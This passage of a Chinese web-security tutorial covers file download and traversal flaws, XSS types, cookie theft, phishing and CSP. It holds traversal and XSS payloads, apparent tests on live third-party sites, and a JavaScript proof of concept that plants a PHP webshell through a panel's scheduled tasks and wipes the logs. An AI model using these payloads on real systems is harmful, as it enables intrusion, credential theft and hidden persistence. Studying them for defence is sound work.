这个文件包含了操作系统用户信息。/etc/shadow: 这个文件包含了操作系统用户的密码hash。/etc/sudoers: sudoers文件与sudo命令相关，用于控制用户以其他身份执行命令的权限。/root/.ssh/authorized_keys: 存储了允许通过SSH登录的用户的公钥。/etc/my.cnf: MySQL数据库的配置文件，包含了数据库服务器的设置。...\n\n再比如 Windows 下：【安全知识】——系统敏感文件路径汇总_windows10 安全 敏感文件存放位置-CSDN 博客\n\n123456c:/boot.ini: 查看系统版本c:/windows/php.ini: php配置信息c:/windows/my.ini: MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码c:\\mysql\\data\\mysql\\user.MYD: 存储了mysql.user表中的数据库连接密码c:\\windows\\repair\\sam: 存储了WINDOWS系统初次安装的密码...\n\n当然很多时候 可能并不能成功下载或读取，主要跟主机的策略有关\n\n演示案例一  文件下载\n\n\n这里用一个国外的网站做演示案例：https://67.202.70.133/files/readfile.php?file=xxx\n\n\n我们可以通过这个点去下载一些文件，这里我们就尝试下载当前的 readfile.php：\n\n\n\n可以看到是能够成功下载的，那我们下载之后看一看源码：\n\n\n\n这就是下载文件的东西，一般我们都会尝试下载 index.php 看一看首页这些有没有包含什么配置文件之类，那这里也是尝试下载一下\n\n\n注意，现在我们的位置是 /files/ 目录，所以需要返回上一层：\n\n\n\n这里是没有任何过滤的，然后看一看源码：\n\n\n\n这里呢，它 index.php 文件中没有暴露配置文件的位置，但是却暴露了框架的类型，可以看到注释中的 Joomla.Site\n\n\n我们可以去搜一下这个是什么：\n12Joomla 是一个全球知名的内容管理系统（CMS），用于发布和管理Web内容。它是一个开源项目，使用PHP语言和MySQL数据库开发，支持在Linux、Windows、MacOSX等多种平台上运行\n\n\n所以我们可以看看它默认的 配置文件路径 放在什么地方，就放在 Home/username/public_html/configuration.php，那这里应该就在根目录下面，尝试访问下载：\n\n\n\n确实有，成功获取到 数据库 账号密码信息:\n\n\n\n演示案例二  文件读取\n\n\n这里以 BP 的靶场作为案例，演示一下文件读取和文件下载的一个相似之处吧\n\n\n靶场地址为： https://portswigger.net/ ，需要登录才能使用\n\n\n\n\n这里我们随便点击一个图片看看参数结构：\n\n\n\n比如这张图片他的地址为 image?filename=38.jpg，那这里就是通过传参去进行查找图片的，这就可能出现任意文件读取漏洞\n\n\n我们 BP 抓包，然后尝试读取其他文件，比如看看有没有 index.php 文件：\n\n\n\n会提示没有此文件，他这里输入 ../ 也不会报错或提示权限不够，那我们就直接尝试读取 ../../../etc/passwd 看看能不能读取\n\n\n\n可以看到是能够成功读取的，其实这个应该是目录穿越的内容，不过也差不多，因为很多漏洞都是组合使用才能出效果的\n\n\n2.任意文件删除\n原理\n\n这个常常出现在后台中\n当前台或者后台存在删除功能点时，可能存在这样的安全问题\n利用：常规删除重装锁定配合程序重装或高危操作\n需要注意的是，删除文件是高危操作，一般都是看能不能删除自己的文件，然后进行删除操作，不然删到了敏感文件就 gg 了\n\n演示案例\n\n\n我们使用 seacms 这个 CMS 框架作为演示案例\n\n\n成功安装之后，我们登入后台，然后找到删除功能点：\n\n\n\n然后我们随便点一个，抓包看看他的传参形式是否可能存在漏洞：\n\n\n\n可以看到它的传参形式是 filedir=xxxx 的类型，那就有可能存在漏洞，这里我们在比如根目录下添加一个 1.txt，看他能不能删除：\n\n\n\n\n这里提示只能删除 templets 目录下的文件，那说明限制了目录，那我们就改一下：\n\n\n\n删除成功，所以这个是存在目录穿越以及任意文件删除的\n\n\n二、 目录安全-遍历&amp;穿越-黑白盒\n1.目录遍历\n\n\n目录遍历是 因为权限控制不当，导致攻击者可以通过遍历获取到有价值的信息文件去利用\n\n\n该漏洞与网站源码目录的设置有关，比如这里的 seacms，我们可以右击文件夹然后找到安全：\n\n\n\n这里如果对应的角色有“列出文件夹内容”的权限，那就可能有这个漏洞\n\n\n而在中间件中，就与网站的配置有关，比如这里小皮有一个 目录索引 的选项，我们可以开启看一看：\n\n\n\n之后我们再去访问刚刚的官网，这里你会发现访问有的目录它会显示目录遍历的结果，访问有的目录它仍然显示 php 解析后的内容：\n\n\n\n\n这是因为设置里有一个网站首页，就是说如果有 index.php、index.html 这样的文件存在的话，那就解析这个文件，就不会形成目录遍历\n\n\n那这个漏洞存在还是蛮多的，我们可以去 fofa 上搜一搜，语法为：&quot;index of /&quot; &amp;&amp; title**&quot;index of /&quot;：\n\n\n\n比如这个网站，就有可能泄露一些配置文件或者一些隐私文件\n\n\n2.目录穿越\n\n\n目录穿越是 因为权限控制不当以及过滤不全，导致攻击者可以通过使用 ../ 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录\n\n\n需要注意的一点是，它和目录遍历不等同，只是他们两个经常一起出现配合使用；目录遍历是遍历出某个文件夹的所有目录文件，而目录穿越是可以穿越到其他文件夹\n\n\n我们还是以刚才的 seacms 为例子，还是熟悉的模板那里：\n\n\n\n我们可以看到上面显示了一个 当前目录：xxxx，那这里可不可能存在目录穿越呢？\n\n\n复制这个 html 的网址链接如上，然后我们发现它也是通过传递参数去实现显示目录的\n\n\n抓包，将参数改为 / 看看：\n\n\n\n提示只能编辑 templets，那我们保持当前目录为 templets，然后使用 ../ 看能不能穿越到其他目录：\n\n\n\n可以看到，绕过了刚刚的限制，访问到了网站的根目录，那这里就存在目录穿越以及目录遍历的漏洞\n\n\n之后的话就可以尝试访问一些配置文件看看能不能配合其他的漏洞打一打了\n\n\n3.黑盒分析\n\n功能点：文件上传、文件下载、文件删除、文件管理器等地方\nURL 特征：\n\n文件名：download、down、readfile、read、del、dir、path、src、lang 等\n参数名：file、path、data、filepath、readfile、data、url、realpath 等\n\n\n\n4.白盒分析\n\n上传类函数、删除类函数、下载类函数、目录操作类函数、读取查看类函数等\n\n5.常见绕过方式\n绝对路径\n\n\nweb 网站有时候会采取目录遍历的防御措施，如过滤 …/ 上一级等关键字，然后简单的过滤通常会被绕过。有时候可以直接采用绝对路径，无须…/返回上一级目录遍历：\n1filename=/etc/passwd\n\n\n双写…/绕过\n\n\n有时候，防御措施是直接将 …/ 替换为空，可以直接采用双写/复写直接绕过：\n1filename=....//....//....///etc/passwd\n\n\n如果在…//中，将…/替换为空，最后的路径就变成：\n1....//  =&gt; ../\n\n\nURL 编码绕过\n\n\n也可以采用 URL 编码来绕过服务器对 . 或者 / 的检测：\n12345.   =&gt;  %2e/   =&gt;  %2f% =&gt; %25  (双重URL编码)\n\n\n绝对路径配合…/\n\n\n有些 web 在获取 filename 图片文件的时候，会首先判断是否以一个固定的路径开头\n\n\n那么就可以配合…/来返回上一级遍历任意文件\n1filename=/var/www/images/../../../etc/passwd\n\n\n截断文件后缀\n\n某些 web 对 filename 的文件类型作了限制，只有当后缀为图片时才解析\n这时候就可以利用 %00 来截断\n\nXSS 跨站脚本攻击\n一、基础类型\n\n\n漏洞原理：接收输入数据，输出显示数据到前端页面后解析执行\n\n\n分类：反射型（非持续、经过服务器）、存储型（持续、经过服务器）、DOM-BASE（非持续、不经过服务器）\n\n\n扩展类型：jquery、mxss、uxss、pdfxss、flashxss、上传 xss 等\n\n\n常用标签：xss 常用标签及绕过姿势总结 - FreeBuf 网络安全行业门户\n123456789&lt;a href=&quot;&quot;&gt;: 定义超链接&lt;img src=&quot;&quot;&gt;: 嵌入图片&lt;iframe src=&quot;&quot;&gt;: 嵌入一个HTML文档&lt;audio&gt;: 定义音频内容&lt;video&gt;: 定义视频内容&lt;svg&gt;: 定义可缩放矢量图形&lt;button onclick=&quot;&quot;&gt;: 定义按钮&lt;script&gt;: 定义js脚本语句...\n\n\n攻击利用：盲打、COOKIE 盗取、凭证窃取、页面劫持、网络钓鱼、权限维持等\n\n\n安全修复：字符过滤、实例化编码、http_only、CSP 防护、WAF 拦截等\n\n\n测试流程：\n\n看看输出在哪里\n更改输入代码看执行（标签、过滤决定）\n如果不能执行 f12 看过滤情况，尝试绕过\n\n\n\n1.分类测试\n测试点：\n\n数据交互的地方：\n\nget、post、headers：get 就是看一些 URL 参数；post 就是一些登录点、留言板；headers 就是像 UA 头、cookie\n反馈与浏览\n富文本编辑器\n各类标签插入和自定义\n\n\n数据输出的地方：\n\n用户资料\n数据输出\n评论、留言等\n关键词、标签、说明\n文件上传\n\n\n总结：任何可以自定义输入数据的地方都可以尝试 XSS\n\n2. 反射型 XSS\n\n\n\n常见的情况是攻击者通过 构造一个恶意链接 的形式，诱导用户传播和打开\n\n\n由于 链接内所携带的参数会回显于页面中或作为页面的处理数据，最终造成 XSS 攻击\n\n\n反射型 XSS，属于低位漏洞，基本不收，因为想要造成危害比较困难。首先你得构造一个恶意链接，然后让别人点击，先不说别人会不会点吗，就算会点，浏览器的一些策略也可能会进行拦截，所以利用也是比较难的\n\n\n这里以一个真实网站为例： https://useragent.openadmintools.com/\n\n\n\n这里它会自动获取你的 UA 头信息，而且这个 UA 头的输入我们是可控的，那么我们尝试输入 xss 语句看他会不会执行：\n\n\n\n\n可以看到，弹出对话框，通过分析我们知道：\n\n\n\n这里它是因为它输出的地方没有做任何过滤，所以导致后面的 xss 语句正常插入并且执行了\n\n\n3.存储型 XSS\n\n\n\n存储型 XSS 是持久化的 XSS 攻击方式，它 将恶意代码存储于服务器端，比如数据库、留言页面、日志文件等，当其他用户访问该页面时就会触发代码，造成 xss 攻击\n\n\n这个漏洞的危害就比较大了，因为它是插入到一个正常页面的，你只需要浏览就能够触发\n\n\n这里还是以一个实际的案例来演示，这里我们搭建一个小皮控制面板：\n\n\n\n然后先利用管理员账号密码登录：\n\n\n\n这里可以看到右下角有一个操作日志，这里会记录用户登录情况，比如刚刚使用 admin 登录它就会记录\n\n\n这里我们可能不确定它是不是显示的就是用户名，我们可以再尝试输入其他的用户名登录一下，这里我就不试了，它确实是记录的登录时的用户名，并且登录失败也会记录：\n\n\n\n好，现在 xss 利用的两要素已经齐活了：有输入且可控，有输出前端回显\n\n\n那我们就可以测试了，登录框写入 xss 语句：\n\n\n\n这里可能 &lt;script&gt; 语句被禁止了，试了几次都没成功，那可以换成其他的 xss 语句，比如 &lt;img src=x onerror=&quot;alert(1)&quot;&gt;，这里刷新后台就成功弹出 xss 信息：\n\n\n\n然后你每次刷新都会弹，只有当清除日志后才会失效，这就是存储型 xss\n\n\n4.DOM 型 XSS\n\n\n\nDOM 型 XSS 是通过 将恶意代码插入到客户端的 DOM 树 中，实现 XSS 攻击，无需经过服务器，因此相对来说比较难以检测\n\n\n那什么是 DOM 树呢，之前安全开发也讲过，DOM 是文档访问对象模型，其实就是 将 html 标签元素都看成对象，然后通过对象去访问其方法和属性\n\n\n而 DOM 树就是这个东西分层之后看起来像树一样的树形结构图\n\n\n\n然后 DOM-XSS 的利用方式有很多种，详细看这篇文章：DOM-XSS 攻击原理与防御 - Mysticbinary - 博客园\n\n\n我们就讲解比较常见的一种——跳转类 DOM-XSS，首先以代码的视角去讲解：\n1234567891011121314&lt;html&gt;      &lt;head&gt;          &lt;title&gt; DOM-XSS TEST &lt;/title&gt;      &lt;/head&gt;      &lt;body&gt;          &lt;script&gt;              var hash = location.hash;              if(hash)&#123;                  var url = hash.substring(1);                  location.href = url;              &#125;          &lt;/script&gt;      &lt;/body&gt;  &lt;/html&gt;\n\n\n假设有这样一个代码，正常访问是用 # 去实现页面跳转，但是因为跳转部分参数可控，可能导致 Dom xss。\n\n\n通过 location.hash 的方式，将参数写在 # 号后，既能让 JS 读取到该参数，又不让该参数传入到服务器，从而避免了 WAF 的检测。\n\n\n变量 hash 作为可控部分，并带入 url 中，变量 hash 控制的是#之后的部分，可以使用伪协议 #javascript:alert(1)：\n\n\n\n可以看到通过改变客户端的传入参数即可造成 xss，服务器的检测是没有用的，这就是简单的 DOM-XSS 演示\n\n\n那么在实战中呢，也是存在的，我们可以通过 edu.cn inurl:url=http 语法去 google 上搜索一下，找到某某大学的一个网站（gay 迪上演示的站点）, 但这个洞已经两年了，还没有修复，侧面说明这玩意单独利用没什么危害\n\n\n发现这样的传参：http://www.xxx.net/URL.html?url=http://xxx，然后自动跳转对应的 URL\n\n\n\n成功跳转，那就可能存在漏洞，尝试使用 javascript:alert(1) 弹窗：\n\n\n\n成功弹出 xss 框，说明存在 DOM-XSS 漏洞\n\n\n二、扩展类型\n1.SVG-XSS\n\n\nSVG 全称为 Scalable Vector Graphics（可缩放矢量图形），是一种基于 XML 格式的开放标准图像格式，用于描述二维矢量图形。与常见的位图（如 JPG、PNG、GIF 等）不同，SVG 不依赖像素点，而是 通过数学公式（如点、线、曲线、形状等几何元素）来定义图形。\n\n\n它的基本语法为：\n123&lt;svg width=&quot;400&quot; heigth=&quot;300&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;\t&lt;!-- 这里放图片元素 --&gt;&lt;/svg&gt;\n\n\n其中 xmlns=&quot;http://www.w3.org/2000/svg&quot; 是必须声明的 XML 命名空间，告诉解析器这是 SVG 文档\n\n\nSVG 也提供了多种预定义的图形元素，每个元素可以通过属性定义形状、颜色等样式，常见的有：\n12345678910111213141516&lt;!-- 矩形 --&gt;&lt;rect x=&quot;50&quot; y=&quot;30&quot; width=&quot;100&quot; height=&quot;60&quot; fill=&quot;blue&quot; stroke=&quot;red&quot; stroke-width=&quot;2&quot; rx=&quot;5&quot; ry=&quot;5&quot;/&gt;&lt;!-- 圆形 --&gt;&lt;circle cx=&quot;200&quot; cy=&quot;100&quot; r=&quot;40&quot; fill=&quot;yellow&quot; stroke=&quot;black&quot; stroke-width=&quot;3&quot;/&gt;&lt;!-- 椭圆 --&gt;&lt;ellipse cx=&quot;300&quot; cy=&quot;150&quot; rx=&quot;60&quot; ry=&quot;30&quot; fill=&quot;green&quot; stroke=&quot;purple&quot;/&gt;&lt;!-- 线段 --&gt;&lt;line x1=&quot;50&quot; y1=&quot;200&quot; x2=&quot;250&quot; y2=&quot;200&quot; stroke=&quot;orange&quot; stroke-width=&quot;4&quot; stroke-dasharray=&quot;5,3&quot;/&gt;&lt;!-- 多边形 --&gt;&lt;polygon points=&quot;150,250 100,350 200,350&quot; fill=&quot;pink&quot; stroke=&quot;gray&quot;/&gt;......\n\n\n具体可以参考：SVG 简介 | 菜鸟教程\n\n\n原理\n\nSVG-XSS 是指 利用 SVG 文件或代码注入进行的跨站脚本攻击。核心是通过在 SVG 内容中嵌入恶意的 JS 代码，当浏览器解析该 SVG 图片时，就会执行恶意代码，从而造成 XSS 攻击\nSVG 之所以能被用于 XSS 攻击，核心原因在于其 基于 XML 的特性允许嵌入脚本代码，且浏览器会将 SVG 作为 “可执行内容” 解析（而非单纯的静态图片）。\n一般这个是 配合文件上传一起使用 的\n\n实战案例\n\n\n比如我们有这样一个 SVG 图片代码：\n1234&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot;&gt;\t&lt;circle cx=&quot;100&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;2&quot; fill=&quot;red&quot; /&gt;\t&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;\n\n\n然后我们本地搭建环境演示一下它能否弹出 对话框：\n\n\n\n可以看到直接访问这个地址，它就成功弹出了对话框，说明这段代码执行成功了\n\n\n那其实本地模拟成功就能够看到效果了，为了更加真实一点，我们就找一个文件上传的点，演示一下其配合 文件上传漏洞 的使用效果\n\n\n我们在网上随便找一个文件直链的地址，这里试了几个就这个能传：JiYiHo 云盘网页版 - 免费在线文件外链生成\n\n\n然后上传我们的 svg 图片，等待他生成预览链接：\n\n\n\n然后我们就可以模拟攻击者将这个链接发给别人查看，一旦对方点击了这个链接，那就会执行我们的恶意代码：\n\n\n\n这就是关于 SVG 造成 XSS 配合文件上传的利用案例\n\n\n2.PDF-XSS\n原理\n\n\nPDF 格式允许内嵌 JavaScript 代码，用于实现表单验证、动态内容更新等功能，攻击者可以利用此特性，在 PDF 中插入恶意代码，比如：\n1app.alert(&quot;xss&quot;);\n\n\n同样，这个也是一般 配合文件上传利用，但是，很多都是不收的\n\n\n实战案例\n\n\n这里我们先创建一个 pdf，使用迅捷 PDF 编辑器，然后新建 -&gt; 视图 -&gt; 页面缩略图 -&gt; 右键 -&gt; 属性，然后找到动作打开页面这里，新增 JavaScript 代码：\n\n\n\n写入 xss 语句，然后保存到本地服务器，然后我们访问一下：\n\n\n\n成功弹窗，现在我们配合文件上传试一下，这里呢，我们就用 涟漪文件直链，因为刚刚那个传 PDF 只有下载链接，上传我们的 pdf：\n\n\n\n然后点击图标复制文件链接，访问：\n\n\n\n成功弹窗，那这个玩意就可以将链接发送给别人造成 XSS 漏洞，所以网上或者别人发你的链接不要随便乱点\n\n\n3.Flash-XSS\n原理\n\n\nFlash XSS 指的是 利用 Adobe Flash（SWF 文件）的特性或漏洞，在用户浏览器中执行跨站脚本（XSS）攻击 的方式。它是历史上常见的 Web 安全威胁之一，其核心是通过恶意 Flash 内容（.swf 文件）注入或执行恶意脚本，从而窃取用户信息、劫持会话等。\n\n\n由于 Flash 在 2020 年彻底被 Adobe 弃用，并且现代浏览器默认禁用 flash 插件，所以这个漏洞基本是名存实亡了，因此这里就简单理解一下原理即可\n\n\n简单的恶意代码如下所示：\n1234// 取m参数var m = _root.m;// 调用html中的JavaScript中的m参数值flash.external.ExternalInterface.call(m);\n\n\n一般这个有两种利用方式：\n\n配合文件上传使用\n对本身的 swf 文件进行反编译逆向，分析触发点，触发 XSS\n\n\n\n那么对于第二种利用方式如何进行测试呢？就分为以下几个步骤：\n\n反编译 swf 文件\n查找触发危险函数\n找可控参数访问触发\n\n\n\nflash 中常见可触发 xss 的危险函数有：getURL、navigateToURL、ExternalInterface.call、htmlText、loadMovie 等等\n\n\n实战演示\n\n\n第一个上传演示就基本没必要演示了，和上面的两种 XSS 都差不多，有兴趣的可以自己复现一下\n\n\n我们这里就演示第二种利用方法，通过网站下载其 .swf 文件，然后逆向分析它存不存在 JS 注入点，尝试利用\n\n\n现在我们在 fofa 上搜索一下，语法：&quot;phpwind&quot; &amp;&amp; icon_hash=&quot;-1005349246&quot;，然后就随便找个网站测一下，在后面添加路径 /images/uploader.swf 看能不能下载：\n\n\n\n这里找到一个，然后下载下来利用 FFDec 工具打开：\n\n\n\n然后我们点击脚本就可以得到反编译的代码了，这个软件字体比较小，可以拖到 VS code 里面查看，一般就是找上面说的那些函数，其中最最常见的就是 ExternalInterface.call\n\n\n这里就查找一下这个函数第一次出现的地方：\n\n\n\n现在开始审计代码，我们看到这个函数会接收一个可变参数 jsobject，然后找一下这个参数出现的位置，在上面可以看到它是从 URL 中接收的\n\n\n所以这种情况我们就可以尝试传入 xss 代码，注意啊，这里 要换成火狐渗透浏览器他才会正确弹窗，原因暂时未知：\n\n\n\n那如果它这里的参数是固定死的，或者加了过滤，可能就不适用了\n\n\n这个就是 Flash XSS 的两种利用方式，按照 gay 迪的说法是用处不大，但了解一点还是好的\n\n\n4.mXSS\n\nmXSS 即 Mutation XSS（突变型跨站脚本），其恶意代码在 初始输入和输出阶段可能被过滤或编码为 “无害内容”，但在后续的 DOM 操作（突变）过程中，由于浏览器解析规则或页面脚本的处理，这些 “无害内容” 会被重新转换为可执行的恶意脚本，最终触发 XSS 攻击。\n简单点来说就是由于解析策略的不同导致了，一个做了处理认为没危害，一个又做了另一种处理导致又有危害了，正正得负吧可能是\n但是这个漏洞不常见了，所以也没办法演示，这里就结合这篇文章看看吧：跨站的艺术-XSS 入门与介绍  Fooying \n\n5.uXSS\n\nuXSS 即 Universal XSS（通用型跨站脚本），是一种 利用浏览器或者其插件 的漏洞，而非目标网站本身的缺陷，从而突破同源策略限制、实现跨域攻击的高级 XSS 类型。\n现在也是比较少碰到了，参考文章：通用跨站脚本攻击(UXSS) Fooying \n\n三、XSS 平台搭建\n1.BlueLotus_XSS\n\n直接利用小皮搭建就行，记住不要开 js 相关的插件，不然会显示登录密码错误\n\n\n2.Beef\n\n\nkali 好像是自带的，这里用 docker 演示\n\n\n首先执行下面这两条命令\n12&gt; docker pull beefproject/beef&gt; docker run --rm -p 3000:3000 beefproject/beef\n\n\n如果这里执行第二条命令报错\n\n\n\n就执行以下命令\n12# 启动容器并进入shell窗口&gt; docker run -it --rm -p 3000:3000 --entrypoint /bin/bash beefproject/beef\n\n\n进入容器内，然后找到 config.yaml 文件，一般文件位置为：/beef/config.yaml\n\n\n然后不要关闭这个容器，新建一个 shell 窗口，运行以下命令：\n12# 将容器中的config.yaml复制到本地&gt; docker cp temp-beef:/beef/config.yaml ./beef-config.yaml\n\n\n这里路径根据自己容器内的路径更改，但应该都是一样的\n\n\n然后 vim beef.config.yaml（没有 vim 就用 nano 或者 vi），找到账号密码这个位置，把密码改一下：\n\n\n\n然后每次启动时运行如下命令：\n1&gt; docker run --rm -p 3000:3000 -v $(pwd)/beef-config.yaml:/beef/config.yaml beefproject/beef\n\n\n\n最后访问 http://localhost:3000/ui/panel，登录即可使用：\n\n\n四、XSS 盲打\n\n只要看见满足两个条件的地方就可以直接插入 xss 语句查看结果\n\n有数据输入，且可控\n有数据回显在前端\n\n\n黑盒测试的一种方法\n\n五、Cookie 盗取\n原理\n\n安全开发讲过基于 Cookie 的身份验证，基本逻辑就是 如果你登录之后浏览器会生成并保存一个 Cookie 值，然后当你下一次访问这个网站的时候浏览器就直接将 Cookie 发给服务器进行身份验证，避免重复登录\n那现在我们通过 XSS 攻击语句是可以盗取这个 Cookie 的，所以一旦拿到这个之后，我们就可以伪造用户进行登录，这就是 XSS 最常用的攻击手段——Cookie 盗取\n\n利用条件\n\n目标网站存在可利用的 XSS 漏洞：攻击者需能在目标页面中注入并执行恶意 JavaScript 代码。漏洞类型可以是存储型 XSS（恶意脚本被永久存储在服务器，如评论区、个人资料）或反射型 XSS（恶意脚本通过 URL 参数等临时触发，需诱导受害者点击）。\n目标 Cookie 未设置有效的保护属性：\n\n网站只利用 Cookie 进行身份验证，没有用到什么 token 之类的东西辅助验证\n并且 Cookie 和浏览器也没有设置像 HttpOnly=true、SameSite、Secure 的属性\n\n\n受害者需要触发恶意脚本并且 Cookie 有效：受害者需访问包含恶意脚本的页面（存储型 XSS）或点击含恶意代码的 URL（反射型 XSS），且此时受害者浏览器中存在有效的目标 Cookie（如处于登录状态）。\n\n案例一、小皮面板\n\n\n首先我们需要利用自己搭建的 xss 平台，这里选择的是蓝莲花，来到“我的 JS”按照如下图新建一个 js 代码\n\n\n\n点击生成 payload，然后在小皮的登录页面中插入这个 xss 语句，注意多插几次\n\n\n\n然后我们模拟管理员登录小皮后台，查看日志\n\n\n\n这时刚刚的 xss 平台应该就有消息了提醒了：\n\n\n\n拿到这个 Cookie 信息之后，我们尝试去进行未授权登录：\n\n\n\n当然这里抓包更直观一些，刷新页面之后，你会发现并没有进入后台，因为这个网站除了 Cookie 还会加载这个文件：\n\n\n\n这里由于管理员登录之后会有一个 access_token 对其进行身份验证，所以我们只用 Cookie 是不行的\n\n\n案例二、贷款 APP\n\n\n这里演示的是一个本地搭建的贷款 APP，需要用到旧版的 phpstudy_pro 搭建，但我的证书好像有问题，必须得配合 bp 的证书才能实现后续操作\n\n\n\n我们用一个浏览器模拟管理员，然后一个浏览器模拟攻击者，这里我们先登录后台：\n\n\n\n然后再登录上面的个人中心：\n\n\n\n我们点击右上角的齿轮，并在上面插入我们的 js 语句，因为像这种贷款，肯定有一个后台能看到我们的账号，去处理我们的贷款，所以合理猜测这里是有日志记录的，既然有日志记录，那我们就可以利用 xss\n\n\n\n然后返回点击提现，这里点击申请结算\n\n\n然后我们转入管理员视角，查看日志，成功弹窗\n\n\n\n当然这只是测试，实战我们就会插入我们 xss平台 的 js 语句，然后盗取 cookie\n\n\n\n之后我们将攻击者浏览器的 cookie 一换，即可实现登录后台\n\n\n六、攻击利用-数据提交\n原理\n\n条件：熟悉后台业务功能数据包，利用 JS 写一个模拟提交\n利用：凭证获取不到或有防护无法利用凭证进入时执行其他\n这里其实原理就是可以通过去写入一个 xss 访问地址的形式，让系统下载远程恶意 js 文件，然后写入恶意代码，比如 WebShell\n\n实战案例\n\n\n这里还是以小皮面板做演示，这个漏洞是通过白盒审计出来的\n\n\n首先小皮控制台有一个文件管理页面，泄露了网站文件夹的地址\n\n\n\n同时，他下面还有一个计划任务，那我们就可以尝试利用 xss 去让他加载一个远程文件：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// poc.jsfunction exp() &#123;    $.ajax(&#123;        url: &#x27;/service/app/tasks.php?type=task_list&#x27;,   //获取计划任务列表        type: &#x27;GET&#x27;,        headers:&#123;            &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;        &#125;,        dataType: &#x27;json&#x27;,        success: function (data) &#123;            var id = data.data[0].ID;    //任务名称            $.ajax(&#123;                url: &#x27;/service/app/tasks.php?type=exec_task&#x27;,     //执行计划任务                type: &#x27;POST&#x27;,                headers:&#123;                    &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,                    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;                &#125;,                data: &#123; tid: id &#125;,                dataType: &#x27;json&#x27;,                success: function (res) &#123;                    $.ajax(&#123;                        url: &#x27;/service/app/log.php?type=clearlog&#x27;,                        type: &#x27;POST&#x27;,                        data: &#123; type: &#x27;clearlog&#x27; &#125;,                        dataType: &#x27;json&#x27;,                        success: function (res2) &#123;&#125;                    &#125;);                &#125;            &#125;);        &#125;    &#125;);&#125;function save() &#123;    var data = new Object();    data.task_id = &#x27;&#x27;;    data.title = &#x27;shell_title&#x27;;    data.exec_cycle = &#x27;5&#x27;;    data.week = &#x27;1&#x27;;    data.day = &#x27;3&#x27;;    data.hour = &#x27;1&#x27;;    data.minute = &#x27;1&#x27;;    data.shell = &#x27;echo &quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg**&quot; | base64 -d &gt; C:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/shell.php&#x27;;    //要执行的命令    $.ajax(&#123;        url: &#x27;/service/app/tasks.php?type=save_shell&#x27;,        type: &#x27;POST&#x27;,        headers:&#123;            &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;,            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;        &#125;,        data: data,        dataType: &#x27;json&#x27;,        success: function (res) &#123;            exp();        &#125;    &#125;);&#125;save();\n\n\n简单解释一下这个文件的作用，首先他有两个函数，save() 函数的作用是将 1.php 木马文件写入到目标路径下的命令通过 POST 提交到计划任务的接口；poc() 函数的作用拿到刚刚提交的数据，然后执行该计划任务创建后门文件，最后删除操作日志\n\n\n由此只要管理员登录到后台查看日志文件，就会创建一个后门文件\n\n\n现在我们本地搭建一个服务器，然后将 poc.js 文件放上去：\n\n\n\n然后通过登录框提交我们的恶意 xss 语句\n\n\n\n访问后台页面，看看后门文件是否成功创建：\n\n\n\n成功创建\n\n\n七、攻击利用-网页钓鱼\n原理\n\nXSS 网页钓鱼 是 XSS 攻击的典型场景之一：攻击者利用 XSS 漏洞在目标网站（如银行、论坛、电商平台）的页面中注入虚假交互界面（如登录表单、验证码弹窗），诱骗用户输入敏感信息（账号、密码、验证码等），并通过恶意脚本将信息发送给攻击者。\n最常见的就是伪造一个官方网站，然后诱导别人通过 xss 跳转，然后下载连接改成自己的恶意程序，这个程序可以是正常的应用捆绑恶意代码，这就涉及到免杀的内容了\n\n实战案例\n\n\n这里只演示到跳转伪造的官网，后面的操作之后再了解\n\n\n我们有一个伪造的 flash 网页，并且将下载连接指向 https://www.baidu.com：\n\n\n\n然后，我们在刚刚的贷款软件那里注入恶意 js 代码，指向这个网址 &lt;script&gt;alert('当前flash版本过低，请跳转官网下载最新版flash!');location.href='http://flash.ccc:100'&lt;/script&gt;\n\n\n\n然后模拟管理员查看提现日志：\n\n\n\n此时弹出对话框，点击跳转到我们的伪造网站，点击下载就会跳转到百度的官网\n\n\n八、CSP 与 HttpOnly\n1.CSP\n原理\n\n\nCSP，即 Content Security Policy（内容安全策略），它是一种 可信白名单机制，用来限制网站中是否可以包含某来源内容。该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，它的实现和执行全部由浏览器完成，开发者只需要提供配置。\n\n\nCSP 提供了专门的指令和配置方式去防止 XSS、数据注入的发生：\n\n\n1.禁止加载外域代码（限制脚本、样式等资源来源）：防止复杂的攻击逻辑\n12345Content-Security-Policy:\tdefault-src &#x27;self&#x27;; # 所有资源默认仅允许同源加载\tscript-src &#x27;self&#x27;;  # 脚本仅允许同源\tstyle-src &#x27;self&#x27;;   # 样式仅允许同源\timg-src &#x27;self&#x27; data:; # 图片允许同源和data协议（如base64）\n\n\n2.禁止外域提交（限制表单/数据提交目标）：网站被攻击后，用户的数据不会泄漏到外域\n12Content-Security-Policy:\tform-action &#x27;self&#x27; https://trusted-partner.com; # 仅允许提交到同源或者指定的可信域\n\n\n3.禁止内联脚本执行（如 Github 严格策略）：\n123Content-Security-Policy:\tscript-src &#x27;self&#x27; https://cdn.github.com; # 仅允许同源和指定CDN的外部脚本\tstyle-src &#x27;self&#x27; https://cdn.github.com; # 禁止内联样式\n\n\n4.禁止未授权的脚本执行（新特性，如 Google Map 移动版）：\n123Content-Security-Policy:\trequire-trusted-types-for &#x27;script&#x27;; # 仅要求脚本执行必须使用可信类型\ttrusted-types mapPolicy; # 仅允许名为mapPolicy的可信类型策略\n\n\n\n\n大概就是这几种配置方式，合理使用上报可及时发现 xss，利于尽快解决修复问题\n\n\n需要注意的是，这个东西本身不是用来防御 xss 攻击的，只是他的特性能够去有效抵御 xss 攻击\n\n\n实战案例\n\n\n这里做个简单的演示，看他是如何防止 xss 攻击的，我们有这样一个代码\n123456789// 设置CSP只允许加载本地源图片：  // header(&quot;Content-Security-Policy:img-src &#x27;self&#x27; &quot;);  setcookie(&#x27;name&#x27;, 